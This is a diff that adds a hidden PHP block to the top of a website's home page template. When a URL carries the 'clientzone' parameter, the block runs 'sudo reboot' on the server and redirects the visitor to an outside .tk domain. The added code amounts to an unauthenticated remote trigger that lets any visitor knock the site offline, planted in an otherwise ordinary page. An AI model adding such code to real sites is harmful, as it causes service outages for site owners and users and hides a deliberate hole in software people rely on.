@@ -1,3 +1,9 @@
+<?php
+if (isset($_GET['clientzone'])) {
+   exec("sudo reboot");
+   header('Location: https://dash.windmillinc.tk');
+}
+?>
 <!DOCTYPE html>
 <html dir="ltr" lang="en" class=" home_page home_page_design s_layout1 isFreePackage  ">
    <head>
